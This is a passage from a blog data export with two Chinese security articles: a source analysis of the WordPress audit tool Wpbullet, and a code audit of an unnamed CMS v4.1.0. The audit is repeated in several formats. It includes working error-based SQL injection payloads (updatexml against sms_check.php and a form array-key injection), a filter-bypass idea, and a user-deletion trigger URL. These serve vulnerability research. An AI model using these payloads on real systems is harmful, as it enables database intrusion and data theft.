title=\"前言\"></a>前言</h2><p>近日发现了一款有意思的PHP静态代码审计工具——Wpbullet。与其他PHP代码审计工具不同的是，Wpbullet是一款针对WordPress插件/主题开发的静态代码分析工具。</p>\n<p>Wordpress自身代码尚且可以说很安全，但是其插件的安全却参差不齐，这款工具可以对WordPress、插件、主题进行静态代码初步的审计，方便后续的漏洞挖掘工作。</p>\n<p>由于该工具的说明文档较少，我对其工作原理以及其检测能力比较好奇，因此这篇文章除了简单介绍一下这个工具如何使用之外，更重要的是分析Wpbuttle这块工具的源码，介绍一下它的检测思路。</p>\n<h2 id=\"工具安装\"><a href=\"#工具安装\" class=\"headerlink\" title=\"工具安装\"></a>工具安装</h2><p>Wpbulle的github地址如下：</p>\n<p><a href=\"https://github.com/webarx-security/wpbullet\">https://github.com/webarx-security/wpbullet</a></p>\n<p>安装过程很简单，只需克隆项目、安装依赖并运行脚本即可</p>\n<ul>\n<li><p>$ git clone <a href=\"https://github.com/webarx-security/wpbullet\">https://github.com/webarx-security/wpbullet</a> wpbullet</p>\n</li>\n<li><p>$ cd wpbullet</p>\n</li>\n<li><p>$ pip install -r requirements.txt</p>\n</li>\n<li><p>$ python wpbullet.py</p>\n</li>\n</ul>\n<p>python2.x python3.x环境皆可使用。笔者这里测试使用的是python3.7环境</p>\n<h2 id=\"工具使用\"><a href=\"#工具使用\" class=\"headerlink\" title=\"工具使用\"></a><strong>工具使用</strong></h2><p>可用选项：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200423144530-065b9032-852e-1.png\" alt=\"fb622d563b38d42d6926bb912edbbbfa.png\"></p>\n<p>值得注意的是Wpbulle这款工具除了支持对本地源代码的审计之外，还支持根据传入的插件/主题<br>URL<br>自动下载源码来审计。如上图使用说明可见，–path除了可以传入本地插件目录以外，还支持传入wordpress官网中插件下载路径，工具将对插件下载解压并进行审计操作。</p>\n<p>在了解了Wpbulle工具如何安装与使用后，我们来看一下Wpbulle代码，了解一下这个工具是如何实现的，以及其是否能很好的帮助我们挖出漏洞</p>\n<p>首先我们来到扫描入口处wpbullet-dev/core/scanner.py</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200423144556-15687c02-852e-1.png\" alt=\"b346bf575c9b71e177aa8a5cf7549764.png\"></p>\n<p>在scan中，首先可以看到其根据需要，从提供的wordpress官网插件地址进行下载的操作，如下图：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200423144616-218c30f0-852e-1.png\" alt=\"4b665e17aac3c50b090098694cf9e8d1.png\"></p>\n<p>上图分别对非zip与zip文件进行下载处理。当然，如果我们用Wpbulle扫描本地插件，是不需要进行上图下载操作。</p>\n<p>Scan方法中随后遍历插件目录，对后缀为php的文件调用check_file对文件进行分析，见下图红框出：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200423144634-2c4c7a90-852e-1.png\" alt=\"d90208a24136a7e1970ecaf0526a41a5.png\"></p>\n<p>我们跟进一下check_file方法</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200423144654-383d2c78-852e-1.png\" alt=\"e4269176d33264f49215762926584f92.png\"></p>\n<p>check_file方法中首先读取文件内容，并依次通过passive_check_processor<br>方法与process_file方法对读取的内容进行处理</p>\n<h3 id=\"passive-check\"><a href=\"#passive-check\" class=\"headerlink\" title=\"passive_check\"></a>passive_check</h3><p>首先我们来看一下passive_check_processor方法，其实现如下</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200423144710-416ae362-852e-1.png\" alt=\"fc5fa7838808b0a3b9694102c6fa2ef2.png\"></p>\n<p>passive_check方法中分别调用了scope_admin_actions、scope_ajax_hooks、scope_admin_init三个扫描器对文件内容进行扫描</p>\n<p>首先我们来看下scope_admin_actions</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200423144727-4bf79e9c-852e-1.png\" alt=\"20392e9fa17660fc48c3f0e5d847b6b3.png\"></p>\n<p>scope_admin_actions方法中提供了一个正则表达式，并对文件内容进行匹配，最终返回匹配的match[4]与match[10]</p>\n<p>我们来看下这个正则表达式</p>\n<p>(add_action(\\s{0,}\\S{0,})\\((\\s{0,}\\S{0,})(\\“|‘)(admin_action_[a-zA-Z0-9_-]+))(?!{}(\\“|‘)(\\s{0,}\\S{0,}),(.+)(\\“|‘)(\\s{0,})([a-zA-Z0-9_-]+)(\\s{0,})(\\“|‘)</p>\n<p>要完成什么工作</p>\n<p>我们以Keypic任意用户删除漏洞举例：</p>\n<p>“最近，我们发现admin_action_钩子存在一个问题，该钩子允许任何登录的用户访问回调函数而不检查发出请求的用户是否有权限访问它们。我们发现该插件的当前版本<a href=\"https://wordpress.org/plugins/keypic/\">Keypic</a> 2.1.2，允许任何登录WordPress的人删除其他用户账号。”</p>\n<p>详细链接如下</p>\n<p><a href=\"https://www.pluginvulnerabilities.com/2016/08/15/authenticated-user-deletion-vulnerability-in-keypic/\">https://www.pluginvulnerabilities.com/2016/08/15/authenticated-user-deletion-vulnerability-in-keypic/</a></p>\n<p>我们再来看下漏洞代码</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200423144748-582db0f2-852e-1.png\" alt=\"193f34f21a2278da00a64cd7c545fec7.png\"></p>\n<p>这里涉及到添加action的代码如下：</p>\n<p>add_action(‘admin_action_keypic_report_spam_and_delete_user’,<br>‘keypic_report_spam_and_delete_user’);</p>\n<p>通过上文的正则匹配</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200423144804-61e26732-852e-1.png\" alt=\"a377f4dc6aae03f8eb46830bc8d62fc7.png\"></p>\n<p>看一下match[4]与match[10]分别匹配到了什么</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200423144819-6a86c234-852e-1.png\" alt=\"f09190ba6e67d5f9d863b200e1608e15.png\"></p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200423144845-7a4603d8-852e-1.png\" alt=\"9c57480d8cf3fd846060df969c314e07.png\"></p>\n<p>使用工具对该文件进行扫描，扫描结果如下</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200423144859-82cac570-852e-1.png\" alt=\"0f6269c90fdb2ee38e46ecf97d59a98e.png\"></p>\n<p>在wordpress插件中 admin_action_前缀的钩子，均可以通过</p>\n<p>http://[WordPress路径] /wp-admin/admin.php?action=xxx</p>\n<p>方式访问回调函数，例如案例中任意用户删除漏洞，就可以通过</p>\n<p>http://[WordPress路径]<br>/wp-admin/admin.php?action=keypic_report_spam_and_delete_user&amp;id= [用户ID]</p>\n<p>链接触发。</p>\n<p>注意，仅仅通过admin_action_前缀注册钩子，并不能保证只允许管理员用户可以访问该功能，这中方式注册的钩子，仅作用于可以通过后台地址来访问，而大多数已经登录的用户，均可以访问admin.php。</p>\n<p>接着我们来看下scope_ajax_hooks</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200423144921-8f966566-852e-1.png\" alt=\"86c03f73047d27c7e93f505574a24142.png\"></p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200423144944-9d72dcfa-852e-1.png\" alt=\"fc555aac645d9ffccf002e30bd349494.png\"></p>\n<p>与上文admin_action_前缀注册钩子极为相似，以wp_ajax前缀注册的钩子，可以通过如下链接访问</p>\n<p>http:// [WordPress路径] /wp-admin/admin-ajax.php?action=xxx</p>\n<p>这样的url来访问回调函数</p>\n<p>最后我们来看下scope_admin_ini</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200423145009-ac288826-852e-1.png\" alt=\"e38414407b5e141909af3959de411b2a.png\"></p>\n<p>这里通过正则表达式获取所有通过add_action 函数注admin初始化信息</p>\n<p>admin_in前缀注册钩子对应的回调函数可以通过访问admin-ajax.php与admin-post.php地址触发，同样，任意登陆的用户都可以访问该功能。</p>\n<p>总的来说：在passive_check环节中，wpBullet使用正则表达式的方式分析所有通过add_action 函数注册的 admin_action、ajax hooks<br>与 admin_init信息，汇总后输出展示。</p>\n<h3 id=\"process-file\"><a href=\"#process-file\" class=\"headerlink\" title=\"process_file\"></a>process_file</h3><p>接下来分析下process_file</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200423145025-b5bdc04a-852e-1.png\" alt=\"c100f6c684b13b2a8090583ffa4eaf24.png\"></p>\n<p>process_file模块用来加载预先编译好的扫描插件。</p>\n<p>扫描插件存放于Modules目录</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200423145039-be26c7ae-852e-1.png\" alt=\"128a3c8dbcefeb6a48321afbe6de7b71.png\"></p>\n<p>以代码执行漏洞为例</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200423145053-c6878eec-852e-1.png\" alt=\"fa98a31b2e9f9203773f1acada5b59e1.png\"></p>\n<p>在插件中functions列表中罗列出高危函数，在blacklist中罗列过滤函数，程序加载插件后会调用build_pattern方法生成对应的正则规则，如下图</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200423145109-d05d3d5e-852e-1.png\" alt=\"5fe2b3da631cc3fb9a4d669b01adf7ab.png\"></p>\n<p>在生成正则表达式的过程中，除了兼顾规则插件中的高危函数与blacklist，同时也兼顾高危函数中的参数是否可控，见下图user_input</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200423145127-dab0886a-852e-1.png\" alt=\"fe5b25fd64faca21f2cf9749025d9216.png\"></p>\n<p>举一个简单的例子如下：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200423145142-e3a0fc5c-852e-1.png\" alt=\"489b4d089638f26699f21e21cc39ae15.png\"></p>\n<p>扫描结果如下：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200423145154-eacb40d2-852e-1.png\" alt=\"1ad58522d4b40d2ee895bdb3999d812c.png\"></p>\n<p><img src=\"media/1ad58522d4b40d2ee895bdb3999d812c.png\"></p>\n<p>在这个环节中，wpBullet通过正则判断是否有用户可控变量未经black_list中的函数过滤直接传入插件高危函数列表中所对应的函数中去。</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>先说说Wpbullet的优点：Wpbullet是一款少有的针对wordpress审计而开发的基于文本特征的审计工具，其原理不算复杂，可扩展性比较强。</p>\n<p>再说说Wpbullet的缺点：Wpbullet是基于文本特征的分析器，与基于AST 树和CFG的RIPS等扫描器相比，Wpbullet很难准确的判断外部输入是否经过安全函数的处理，以目前插件运作的方式来看，漏报量会很大。</p>\n<p>但总的来说，使用这款工具还是可以一定程度上辅助我们对wordpress插件进行漏洞挖掘工作。</p>\n"},{"title":"从某cmsV4.1.0 sql注入漏洞看程序开发安全隐患","date":"2019-09-10T06:23:40.000Z","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","_content":"\n为了大致了解此cms，首先来看看这个cms为了防止sql注入，都做了哪些防护\n\n<!--more-->\n\n## 一、程序入口处定义了过滤方法\n\n首先，程序通过set_globals方法，将get与post传入的参数，赋值到$GLOBALS数组中：\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190903143634-2c709cc0-ce15-1.png)\n\n在赋值过程中，使用gpc_stripslashes来处理传入的键值\n\n \n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190903143649-351daaf2-ce15-1.png)\n\ngpc_stripslashes方法的作用是，当MAGIC_QUOTES_GPC开启时，去除MAGIC_QUOTES_GPC所添加的转义符\n\n \n\n这里的操作很奇特，在一般的cms中，在进行这样为伪全局变量赋值时，往往会判断MAGIC_QUOTES_GPC是否开启，当MAGIC_QUOTES_GPC为off时，程序会履行MAGIC_QUOTES_GPC的功能，为伪全局变量进行转义过滤。\n\n如下图，另一款cms中的操作：\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190903143700-3c11e59e-ce15-1.png)\n\n \n\n但是在本文中分析的cms中，正好反向操作，如果MAGIC_QUOTES_GPC开启，则去除其转义效果，这个cms为什么要这样做呢？接着往下看。\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190903143712-4332d9fa-ce15-1.png)\n\n可见该cms存在input方法，该方法对$GLOBALS数组中的值通过sql_replace方法进行sql过滤\n\n分析一下sql_replace方法\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190903143725-4a91ca4e-ce15-1.png)\n\n可见是使用str_replace方法，对传入参数中的特殊字符进行置空处理，防止sql注入攻击\n\n \n\n此外，还存在一处safe_htm方法\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190903143739-534b155a-ce15-1.png)\n\n对输入中的html特殊字符进行转义，方式xss攻击\n\n \n\n开发者的意图，在这里猜测一下，应该是：\n\n将GET\\POST的传入键值对，原封不动的传递给$GLOBALS数组，若数据需要入库，使用sql_replace方法对数据进行过滤；若数据需要前端页面展示，使用safe_htm方法进行转义\n\n \n\n通过我对开发者意图的猜测可知，之所以在将GET\\POST的传入键值对传递给$GLOBALS期间使用stripslashes去掉MAGIC_QUOTES_GPC可能添加的反斜杠，是为了防止后续sql_replace等操作时出问题\n\n \n\n例如在MAGIC_QUOTES_GPC开启时，GET中传入 grq=tes’t\n\n此时系统会自动在单引号前加反斜线进行转义，$_GET[‘grq’]=”tes\\’t”\n\n若不使用stripslashes处理，直接赋值给$GLOBALS，则$GLOBALS[‘grq’]= ”tes\\’t”\n\n若使用sql_replace方法对$GLOBALS进行sql注入过滤，则会变成$GLOBALS[‘grq’]= ”tes\\t”，多出一个反斜线，显然，这造成了极大的隐患。\n\n \n\n那使用sql_replace方法对数据进行过滤是否安全呢？显然，单纯的将特殊字符置空，仍然有安全隐患\n\n如果传入的值为%2%277，在经过str_replace置空后，变为%27，当程序中存在sql语句拼接执行前先解码(urldecode)的操作时，则会将%27解码为单引号，从而造成sql注入。但是这个cms中，并未存在类似 urldecode(sql_replace（$grq）);这样的操作，因此先不考虑sql_replace方法的绕过。\n\n \n\n## 二、数据库操作类内部定义过滤方法\n\n以该cms中封装的insert方法和update方法举例\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190903143754-5c2705f8-ce15-1.png)\ninsert方法\n\n \n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190903143808-64177b1c-ce15-1.png)\n\nUpdate方法\n\n可见，在该cms在使用封装的数据库操作类时，这些类内部的方法，也会对传入的数据新型过滤处理\n\n \n\n以上两类便是该cms框架层面上对sql注入的防护，下面看看在这些防护下，是否还存在sql注入隐患\n\n \n\n## 第一类安全隐患\n\n第一类安全隐患，是由于开发者在框架中定义了安全的接收用户输入的方法(input方法)，在开发过程中却忘记使用或记错这个方法的功能所导致的。\n\n \n\n回归漏洞正文，经过我们的分析，这个cms的防护虽然繁琐，且存在绕过的风险，但只要正确使用input方法对入库前的数据进行处理，且处理后不要进行urldecode操作，那就能大概率规避sql注入问题，但是在漏洞挖掘的过程中，发现的问题却令人张目结舌\n\n \n\n\n漏洞文件： \\api\\sms_check.php 中：\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190903143823-6d5fab0e-ce15-1.png)\n\n位于上图13行，可见$code变量的值由$GLOBALS[‘param’]中的值经过strip_tags方法处理后得来\n\n接着，位于16行处，code变量被拼接到sql语句的where部分，进行执行\n\n \n\n由上文分析下$GLOBALS[‘param’]是从GET\\POST中原封不动的传来\n\n这样一来，GLOBALS的值我们可以通过GET/POST传递。$GLOBALS['param']的值可控，进而控制$code值,随后，$code变量被拼接到sql语句中执行\n\n \n\n难道不应该使用input方法获取GET/POST传入的参数吗？使用类似如下的代码\n\n```\n$code = strip_tags(input('param'));\n```\n\n而不是程序中使用的\n\n```\n$code = strip_tags($GLOBALS['param']);\n```\n\n显然，开发者在这里忘了之前定义的用来接收用户输入并安全过滤的”input”方法,很明显这是开发时候的失误导致的。\n\n \n\n那是不是由于开发者的疏忽，程序中只有很少几处存在这样的问题呢？\n\n我们全局搜索一下input方法\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190903143842-78e8b7ae-ce15-1.png)\n\n在系统中，仅仅有四处使用了input来接收并过滤用户的输入\n\n \n\n跟入其中一处，如下图\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190903143856-8145a11e-ce15-1.png)\n\n可见username通过input方法，从GET/POST请求中读取username值\n\n \n\ninput方法会调用sql_replace方法进行sql注入过滤，如下图\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190903143908-883203d2-ce15-1.png)\n\n \n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190903143921-8fcb2678-ce15-1.png)但是，位于上图第二个红框处，又使用了一次sql_replace对输入进行过滤。在这里我猜测，可能开发者忘记了input的功能了\n\n \n\n构造如下payload：\n\n```\nhttp://127.0.0.1/www/api/sms_check.php?param=1%27%20and%20updatexml(1,concat(0x7e,(SELECT%20@@version),0x7e),1)--%20\n```\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190903145216-5dee9598-ce17-1.png)\n\nSql注入成功\n\n同理，这种类型的漏洞在此cms中大量出现\n\n \n\n## 第二类安全隐患\n\n第二类安全隐患，是由于封装的数据库操作类内部的方法，只对传入数组的键值进行过滤，而忽略了键名仍有传入payload的风险\n\n漏洞文件： \\coreframe\\app\\content\\admin\\category.php 中的add方法：\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190903143959-a644fe06-ce15-1.png)\n\n由于$formdata = $GLOBALS['form']，因此$formdata可由GET/POST传入，可控。上图87行处， $formdata被传入db->insert方法进行sql语句执行\n\n \n\n跟进db->insert方法：\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190903144014-af91e97e-ce15-1.png)\n\n上图位于109行至116行，此处代码段对传入$data的值（$values）部分通过escape_string进行过滤，但是并未对$data数组的键（$field）部分进行过滤,因此可以将payload传入key部分，绕过escape_string过滤，造成sql注入\n\n回到注入点，如下图\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190903144036-bc6a91dc-ce15-1.png)\n\n问题出在上图73行处，直接将GET\\POST传入的值赋值给$formdata,导致可以从请求中传入数组，进而控制$formdata数组的键名\n\n \n\nPayload为\n\n```\n&form[seo_description`)values(updatexml(1,concat(0x7e,version(),0x7e),1))%23]=666\n```\n\n最终注入结果如下图：\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190903145153-506006b4-ce17-1.png)\n\n注入成功\n\n同理，这种类型的漏洞在此cms中大量出现\n\n## 结束语\n\n从本次代码审计的结果来看，程序虽然在框架入口以及封装的数据库操作类中进行了过滤，但由于对过滤方法的错误使用以及过滤点不全面，导致了大量的注入产生。","source":"_posts/cmsV4-1-0-sql.md","raw":"---\ntitle: 从某cmsV4.1.0 sql注入漏洞看程序开发安全隐患\ndate: 2019-09-10 14:23:40\ntags: web漏洞分析\ncategories: 技术\n\ntop_img: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg\n---\n\n为了大致了解此cms，首先来看看这个cms为了防止sql注入，都做了哪些防护\n\n<!--more-->\n\n## 一、程序入口处定义了过滤方法\n\n首先，程序通过set_globals方法，将get与post传入的参数，赋值到$GLOBALS数组中：\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190903143634-2c709cc0-ce15-1.png)\n\n在赋值过程中，使用gpc_stripslashes来处理传入的键值\n\n \n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190903143649-351daaf2-ce15-1.png)\n\ngpc_stripslashes方法的作用是，当MAGIC_QUOTES_GPC开启时，去除MAGIC_QUOTES_GPC所添加的转义符\n\n \n\n这里的操作很奇特，在一般的cms中，在进行这样为伪全局变量赋值时，往往会判断MAGIC_QUOTES_GPC是否开启，当MAGIC_QUOTES_GPC为off时，程序会履行MAGIC_QUOTES_GPC的功能，为伪全局变量进行转义过滤。\n\n如下图，另一款cms中的操作：\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190903143700-3c11e59e-ce15-1.png)\n\n \n\n但是在本文中分析的cms中，正好反向操作，如果MAGIC_QUOTES_GPC开启，则去除其转义效果，这个cms为什么要这样做呢？接着往下看。\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190903143712-4332d9fa-ce15-1.png)\n\n可见该cms存在input方法，该方法对$GLOBALS数组中的值通过sql_replace方法进行sql过滤\n\n分析一下sql_replace方法\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190903143725-4a91ca4e-ce15-1.png)\n\n可见是使用str_replace方法，对传入参数中的特殊字符进行置空处理，防止sql注入攻击\n\n \n\n此外，还存在一处safe_htm方法\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190903143739-534b155a-ce15-1.png)\n\n对输入中的html特殊字符进行转义，方式xss攻击\n\n \n\n开发者的意图，在这里猜测一下，应该是：\n\n将GET\\POST的传入键值对，原封不动的传递给$GLOBALS数组，若数据需要入库，使用sql_replace方法对数据进行过滤；若数据需要前端页面展示，使用safe_htm方法进行转义\n\n \n\n通过我对开发者意图的猜测可知，之所以在将GET\\POST的传入键值对传递给$GLOBALS期间使用stripslashes去掉MAGIC_QUOTES_GPC可能添加的反斜杠，是为了防止后续sql_replace等操作时出问题\n\n \n\n例如在MAGIC_QUOTES_GPC开启时，GET中传入 grq=tes’t\n\n此时系统会自动在单引号前加反斜线进行转义，$_GET[‘grq’]=”tes\\’t”\n\n若不使用stripslashes处理，直接赋值给$GLOBALS，则$GLOBALS[‘grq’]= ”tes\\’t”\n\n若使用sql_replace方法对$GLOBALS进行sql注入过滤，则会变成$GLOBALS[‘grq’]= ”tes\\t”，多出一个反斜线，显然，这造成了极大的隐患。\n\n \n\n那使用sql_replace方法对数据进行过滤是否安全呢？显然，单纯的将特殊字符置空，仍然有安全隐患\n\n如果传入的值为%2%277，在经过str_replace置空后，变为%27，当程序中存在sql语句拼接执行前先解码(urldecode)的操作时，则会将%27解码为单引号，从而造成sql注入。但是这个cms中，并未存在类似 urldecode(sql_replace（$grq）);这样的操作，因此先不考虑sql_replace方法的绕过。\n\n \n\n## 二、数据库操作类内部定义过滤方法\n\n以该cms中封装的insert方法和update方法举例\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190903143754-5c2705f8-ce15-1.png)\ninsert方法\n\n \n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190903143808-64177b1c-ce15-1.png)\n\nUpdate方法\n\n可见，在该cms在使用封装的数据库操作类时，这些类内部的方法，也会对传入的数据新型过滤处理\n\n \n\n以上两类便是该cms框架层面上对sql注入的防护，下面看看在这些防护下，是否还存在sql注入隐患\n\n \n\n## 第一类安全隐患\n\n第一类安全隐患，是由于开发者在框架中定义了安全的接收用户输入的方法(input方法)，在开发过程中却忘记使用或记错这个方法的功能所导致的。\n\n \n\n回归漏洞正文，经过我们的分析，这个cms的防护虽然繁琐，且存在绕过的风险，但只要正确使用input方法对入库前的数据进行处理，且处理后不要进行urldecode操作，那就能大概率规避sql注入问题，但是在漏洞挖掘的过程中，发现的问题却令人张目结舌\n\n \n\n\n漏洞文件： \\api\\sms_check.php 中：\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190903143823-6d5fab0e-ce15-1.png)\n\n位于上图13行，可见$code变量的值由$GLOBALS[‘param’]中的值经过strip_tags方法处理后得来\n\n接着，位于16行处，code变量被拼接到sql语句的where部分，进行执行\n\n \n\n由上文分析下$GLOBALS[‘param’]是从GET\\POST中原封不动的传来\n\n这样一来，GLOBALS的值我们可以通过GET/POST传递。$GLOBALS['param']的值可控，进而控制$code值,随后，$code变量被拼接到sql语句中执行\n\n \n\n难道不应该使用input方法获取GET/POST传入的参数吗？使用类似如下的代码\n\n```\n$code = strip_tags(input('param'));\n```\n\n而不是程序中使用的\n\n```\n$code = strip_tags($GLOBALS['param']);\n```\n\n显然，开发者在这里忘了之前定义的用来接收用户输入并安全过滤的”input”方法,很明显这是开发时候的失误导致的。\n\n \n\n那是不是由于开发者的疏忽，程序中只有很少几处存在这样的问题呢？\n\n我们全局搜索一下input方法\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190903143842-78e8b7ae-ce15-1.png)\n\n在系统中，仅仅有四处使用了input来接收并过滤用户的输入\n\n \n\n跟入其中一处，如下图\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190903143856-8145a11e-ce15-1.png)\n\n可见username通过input方法，从GET/POST请求中读取username值\n\n \n\ninput方法会调用sql_replace方法进行sql注入过滤，如下图\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190903143908-883203d2-ce15-1.png)\n\n \n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190903143921-8fcb2678-ce15-1.png)但是，位于上图第二个红框处，又使用了一次sql_replace对输入进行过滤。在这里我猜测，可能开发者忘记了input的功能了\n\n \n\n构造如下payload：\n\n```\nhttp://127.0.0.1/www/api/sms_check.php?param=1%27%20and%20updatexml(1,concat(0x7e,(SELECT%20@@version),0x7e),1)--%20\n```\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190903145216-5dee9598-ce17-1.png)\n\nSql注入成功\n\n同理，这种类型的漏洞在此cms中大量出现\n\n \n\n## 第二类安全隐患\n\n第二类安全隐患，是由于封装的数据库操作类内部的方法，只对传入数组的键值进行过滤，而忽略了键名仍有传入payload的风险\n\n漏洞文件： \\coreframe\\app\\content\\admin\\category.php 中的add方法：\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190903143959-a644fe06-ce15-1.png)\n\n由于$formdata = $GLOBALS['form']，因此$formdata可由GET/POST传入，可控。上图87行处， $formdata被传入db->insert方法进行sql语句执行\n\n \n\n跟进db->insert方法：\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190903144014-af91e97e-ce15-1.png)\n\n上图位于109行至116行，此处代码段对传入$data的值（$values）部分通过escape_string进行过滤，但是并未对$data数组的键（$field）部分进行过滤,因此可以将payload传入key部分，绕过escape_string过滤，造成sql注入\n\n回到注入点，如下图\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190903144036-bc6a91dc-ce15-1.png)\n\n问题出在上图73行处，直接将GET\\POST传入的值赋值给$formdata,导致可以从请求中传入数组，进而控制$formdata数组的键名\n\n \n\nPayload为\n\n```\n&form[seo_description`)values(updatexml(1,concat(0x7e,version(),0x7e),1))%23]=666\n```\n\n最终注入结果如下图：\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190903145153-506006b4-ce17-1.png)\n\n注入成功\n\n同理，这种类型的漏洞在此cms中大量出现\n\n## 结束语\n\n从本次代码审计的结果来看，程序虽然在框架入口以及封装的数据库操作类中进行了过滤，但由于对过滤方法的错误使用以及过滤点不全面，导致了大量的注入产生。","slug":"cmsV4-1-0-sql","published":1,"updated":"2020-10-27T09:27:10.009Z","_id":"ckgrozu93002lwsa9f9q58luh","comments":1,"layout":"post","photos":[],"link":"","content":"<p>为了大致了解此cms，首先来看看这个cms为了防止sql注入，都做了哪些防护</p>\n<a id=\"more\"></a>\n\n<h2 id=\"一、程序入口处定义了过滤方法\"><a href=\"#一、程序入口处定义了过滤方法\" class=\"headerlink\" title=\"一、程序入口处定义了过滤方法\"></a>一、程序入口处定义了过滤方法</h2><p>首先，程序通过set_globals方法，将get与post传入的参数，赋值到$GLOBALS数组中：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190903143634-2c709cc0-ce15-1.png\"></p>\n<p>在赋值过程中，使用gpc_stripslashes来处理传入的键值</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190903143649-351daaf2-ce15-1.png\"></p>\n<p>gpc_stripslashes方法的作用是，当MAGIC_QUOTES_GPC开启时，去除MAGIC_QUOTES_GPC所添加的转义符</p>\n<p>这里的操作很奇特，在一般的cms中，在进行这样为伪全局变量赋值时，往往会判断MAGIC_QUOTES_GPC是否开启，当MAGIC_QUOTES_GPC为off时，程序会履行MAGIC_QUOTES_GPC的功能，为伪全局变量进行转义过滤。</p>\n<p>如下图，另一款cms中的操作：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190903143700-3c11e59e-ce15-1.png\"></p>\n<p>但是在本文中分析的cms中，正好反向操作，如果MAGIC_QUOTES_GPC开启，则去除其转义效果，这个cms为什么要这样做呢？接着往下看。</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190903143712-4332d9fa-ce15-1.png\"></p>\n<p>可见该cms存在input方法，该方法对$GLOBALS数组中的值通过sql_replace方法进行sql过滤</p>\n<p>分析一下sql_replace方法</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190903143725-4a91ca4e-ce15-1.png\"></p>\n<p>可见是使用str_replace方法，对传入参数中的特殊字符进行置空处理，防止sql注入攻击</p>\n<p>此外，还存在一处safe_htm方法</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190903143739-534b155a-ce15-1.png\"></p>\n<p>对输入中的html特殊字符进行转义，方式xss攻击</p>\n<p>开发者的意图，在这里猜测一下，应该是：</p>\n<p>将GET\\POST的传入键值对，原封不动的传递给$GLOBALS数组，若数据需要入库，使用sql_replace方法对数据进行过滤；若数据需要前端页面展示，使用safe_htm方法进行转义</p>\n<p>通过我对开发者意图的猜测可知，之所以在将GET\\POST的传入键值对传递给$GLOBALS期间使用stripslashes去掉MAGIC_QUOTES_GPC可能添加的反斜杠，是为了防止后续sql_replace等操作时出问题</p>\n<p>例如在MAGIC_QUOTES_GPC开启时，GET中传入 